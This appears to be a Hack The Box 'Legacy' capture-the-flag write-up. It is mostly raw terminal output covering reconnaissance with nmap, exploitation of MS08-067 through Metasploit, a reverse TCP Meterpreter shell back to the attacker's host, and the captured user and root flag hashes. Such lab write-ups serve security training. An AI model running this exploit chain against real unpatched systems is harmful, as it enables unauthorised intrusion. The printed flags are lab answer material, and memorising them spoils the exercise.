#### Legacy

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Exploitation of ``ms08_067_netapi``](#exploitation-of-ms08_067_netapi)

###### Attacker Info

```sh
root@kali:~/legacy# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 1434  bytes 893142 (872.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2933  bytes 339507 (331.5 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.13  netmask 255.255.254.0  destination 10.10.14.13
        inet6 fe80::23dc:6b15:11b5:75aa  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::100b  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 72  bytes 6799 (6.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2122  bytes 97657 (95.3 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/legacy#
```

###### Nmap Scan

```sh
root@kali:~/legacy# nmap -sV -sC -oA legacy.nmap 10.10.10.4

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-05 11:41 EST
Nmap scan report for 10.10.10.4
Host is up (0.20s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d01h57m58s, deviation: 0s, median: 5d01h57m58s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:9f:37 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2018-02-10T20:39:33+02:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 272.88 seconds
root@kali:~/legacy#
```

###### Exploitation of ``ms08_067_netapi``

```sh
root@kali:~/legacy# msfconsole

     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v4.16.32-dev                         ]
+ -- --=[ 1726 exploits - 987 auxiliary - 300 post        ]
+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search ms08_067
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                 Disclosure Date  Rank   Description
   ----                                 ---------------  ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption


msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > show info

       Name: MS08-067 Microsoft Server Service Relative Path Stack Corruption
     Module: exploit/windows/smb/ms08_067_netapi
   Platform: Windows
       Arch:
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Great
  Disclosed: 2008-10-28

Provided by:
  hdm <x@hdm.io>
  Brett Moore <brett.moore@insomniasec.com>
  frank2 <frank2@dc949.org>
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic Targeting
  1   Windows 2000 Universal
  2   Windows XP SP0/SP1 Universal
  3   Windows 2003 SP0 Universal
  4   Windows XP SP2 English (AlwaysOn NX)
  5   Windows XP SP2 English (NX)
  6   Windows XP SP3 English (AlwaysOn NX)
  7   Windows XP SP3 English (NX)
  8   Windows XP SP2 Arabic (NX)
  9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
  10  Windows XP SP2 Chinese - Simplified (NX)
  11  Windows XP SP2 Chinese - Traditional (NX)
  12  Windows XP SP2 Czech (NX)
  13  Windows XP SP2 Danish (NX)
  14  Windows XP SP2 German (NX)
  15  Windows XP SP2 Greek (NX)
  16  Windows XP SP2 Spanish (NX)
  17  Windows XP SP2 Finnish (NX)
  18  Windows XP SP2 French (NX)
  19  Windows XP SP2 Hebrew (NX)
  20  Windows XP SP2 Hungarian (NX)
  21  Windows XP SP2 Italian (NX)
  22  Windows XP SP2 Japanese (NX)
  23  Windows XP SP2 Korean (NX)
  24  Windows XP SP2 Dutch (NX)
  25  Windows XP SP2 Norwegian (NX)
  26  Windows XP SP2 Polish (NX)
  27  Windows XP SP2 Portuguese - Brazilian (NX)
  28  Windows XP SP2 Portuguese (NX)
  29  Windows XP SP2 Russian (NX)
  30  Windows XP SP2 Swedish (NX)
  31  Windows XP SP2 Turkish (NX)
  32  Windows XP SP3 Arabic (NX)
  33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
  34  Windows XP SP3 Chinese - Simplified (NX)
  35  Windows XP SP3 Chinese - Traditional (NX)
  36  Windows XP SP3 Czech (NX)
  37  Windows XP SP3 Danish (NX)
  38  Windows XP SP3 German (NX)
  39  Windows XP SP3 Greek (NX)
  40  Windows XP SP3 Spanish (NX)
  41  Windows XP SP3 Finnish (NX)
  42  Windows XP SP3 French (NX)
  43  Windows XP SP3 Hebrew (NX)
  44  Windows XP SP3 Hungarian (NX)
  45  Windows XP SP3 Italian (NX)
  46  Windows XP SP3 Japanese (NX)
  47  Windows XP SP3 Korean (NX)
  48  Windows XP SP3 Dutch (NX)
  49  Windows XP SP3 Norwegian (NX)
  50  Windows XP SP3 Polish (NX)
  51  Windows XP SP3 Portuguese - Brazilian (NX)
  52  Windows XP SP3 Portuguese (NX)
  53  Windows XP SP3 Russian (NX)
  54  Windows XP SP3 Swedish (NX)
  55  Windows XP SP3 Turkish (NX)
  56  Windows 2003 SP1 English (NO NX)
  57  Windows 2003 SP1 English (NX)
  58  Windows 2003 SP1 Japanese (NO NX)
  59  Windows 2003 SP1 Spanish (NO NX)
  60  Windows 2003 SP1 Spanish (NX)
  61  Windows 2003 SP1 French (NO NX)
  62  Windows 2003 SP1 French (NX)
  63  Windows 2003 SP2 English (NO NX)
  64  Windows 2003 SP2 English (NX)
  65  Windows 2003 SP2 German (NO NX)
  66  Windows 2003 SP2 German (NX)
  67  Windows 2003 SP2 Portuguese - Brazilian (NX)
  68  Windows 2003 SP2 Spanish (NO NX)
  69  Windows 2003 SP2 Spanish (NX)
  70  Windows 2003 SP2 Japanese (NO NX)
  71  Windows 2003 SP2 French (NO NX)
  72  Windows 2003 SP2 French (NX)

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  RHOST                     yes       The target address
  RPORT    445              yes       The SMB service port (TCP)
  SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)

Payload information:
  Space: 408
  Avoid: 8 characters

Description:
  This module exploits a parsing flaw in the path canonicalization
  code of NetAPI32.dll through the Server Service. This module is
  capable of bypassing NX on some operating systems and service packs.
  The correct target must be used to prevent the Server Service (along
  with a dozen others in the same process) from crashing. Windows XP
  targets seem to handle multiple successful exploitation events, but
  2003 targets will often crash or hang on subsequent attempts. This
  is just the first version of this module, full support for NX bypass
  on 2003, along with other platforms, is still in development.

References:
  https://cvedetails.com/cve/CVE-2008-4250/
  OSVDB (49243)
  https://technet.microsoft.com/en-us/library/security/MS08-067
  http://www.rapid7.com/vulndb/lookup/dcerpc-ms-netapi-netpathcanonicalize-dos

msf exploit(windows/smb/ms08_067_netapi) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows 2003 SP0 Universal
   4   Windows XP SP2 English (AlwaysOn NX)
   5   Windows XP SP2 English (NX)
   6   Windows XP SP3 English (AlwaysOn NX)
   7   Windows XP SP3 English (NX)
   8   Windows XP SP2 Arabic (NX)
   9   Windows XP SP2 Chinese - Traditional / Taiwan (NX)
   10  Windows XP SP2 Chinese - Simplified (NX)
   11  Windows XP SP2 Chinese - Traditional (NX)
   12  Windows XP SP2 Czech (NX)
   13  Windows XP SP2 Danish (NX)
   14  Windows XP SP2 German (NX)
   15  Windows XP SP2 Greek (NX)
   16  Windows XP SP2 Spanish (NX)
   17  Windows XP SP2 Finnish (NX)
   18  Windows XP SP2 French (NX)
   19  Windows XP SP2 Hebrew (NX)
   20  Windows XP SP2 Hungarian (NX)
   21  Windows XP SP2 Italian (NX)
   22  Windows XP SP2 Japanese (NX)
   23  Windows XP SP2 Korean (NX)
   24  Windows XP SP2 Dutch (NX)
   25  Windows XP SP2 Norwegian (NX)
   26  Windows XP SP2 Polish (NX)
   27  Windows XP SP2 Portuguese - Brazilian (NX)
   28  Windows XP SP2 Portuguese (NX)
   29  Windows XP SP2 Russian (NX)
   30  Windows XP SP2 Swedish (NX)
   31  Windows XP SP2 Turkish (NX)
   32  Windows XP SP3 Arabic (NX)
   33  Windows XP SP3 Chinese - Traditional / Taiwan (NX)
   34  Windows XP SP3 Chinese - Simplified (NX)
   35  Windows XP SP3 Chinese - Traditional (NX)
   36  Windows XP SP3 Czech (NX)
   37  Windows XP SP3 Danish (NX)
   38  Windows XP SP3 German (NX)
   39  Windows XP SP3 Greek (NX)
   40  Windows XP SP3 Spanish (NX)
   41  Windows XP SP3 Finnish (NX)
   42  Windows XP SP3 French (NX)
   43  Windows XP SP3 Hebrew (NX)
   44  Windows XP SP3 Hungarian (NX)
   45  Windows XP SP3 Italian (NX)
   46  Windows XP SP3 Japanese (NX)
   47  Windows XP SP3 Korean (NX)
   48  Windows XP SP3 Dutch (NX)
   49  Windows XP SP3 Norwegian (NX)
   50  Windows XP SP3 Polish (NX)
   51  Windows XP SP3 Portuguese - Brazilian (NX)
   52  Windows XP SP3 Portuguese (NX)
   53  Windows XP SP3 Russian (NX)
   54  Windows XP SP3 Swedish (NX)
   55  Windows XP SP3 Turkish (NX)
   56  Windows 2003 SP1 English (NO NX)
   57  Windows 2003 SP1 English (NX)
   58  Windows 2003 SP1 Japanese (NO NX)
   59  Windows 2003 SP1 Spanish (NO NX)
   60  Windows 2003 SP1 Spanish (NX)
   61  Windows 2003 SP1 French (NO NX)
   62  Windows 2003 SP1 French (NX)
   63  Windows 2003 SP2 English (NO NX)
   64  Windows 2003 SP2 English (NX)
   65  Windows 2003 SP2 German (NO NX)
   66  Windows 2003 SP2 German (NX)
   67  Windows 2003 SP2 Portuguese - Brazilian (NX)
   68  Windows 2003 SP2 Spanish (NO NX)
   69  Windows 2003 SP2 Spanish (NX)
   70  Windows 2003 SP2 Japanese (NO NX)
   71  Windows 2003 SP2 French (NO NX)
   72  Windows 2003 SP2 French (NX)


msf exploit(windows/smb/ms08_067_netapi) > set target 7
target => 7
msf exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
RHOST => 10.10.10.4
msf exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    10.10.10.4       yes       The target address
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   7   Windows XP SP3 English (NX)


msf exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.13:4444
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (179779 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.13:4444 -> 10.10.10.4:1032) at 2018-02-05 12:05:49 -0500

meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter >
```

```sh
c:\Documents and Settings\john\Desktop>systeminfo
systeminfo

Host Name:                 LEGACY
OS Name:                   Microsoft Windows XP Professional
OS Version:                5.1.2600 Service Pack 3 Build 2600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Uniprocessor Free
Registered Owner:          user
Registered Organization:   HTB
Product ID:                55274-643-7213323-23904
Original Install Date:     16/3/2017, 7:32:23 ��
System Up Time:            0 Days, 18 Hours, 35 Minutes, 50 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 6 Model 63 Stepping 2 GenuineIntel ~2592 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     511 MB
Available Physical Memory: 358 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 2.005 MB
Virtual Memory: In Use:    43 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
NetWork Card(s):           1 NIC(s) Installed.
                           [01]: VMware Accelerated AMD PCNet Adapter
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.4

c:\Documents and Settings\john\Desktop>
```

```
C:\Documents and Settings\john\Desktop>type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings\john\Desktop>
```

```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>
```
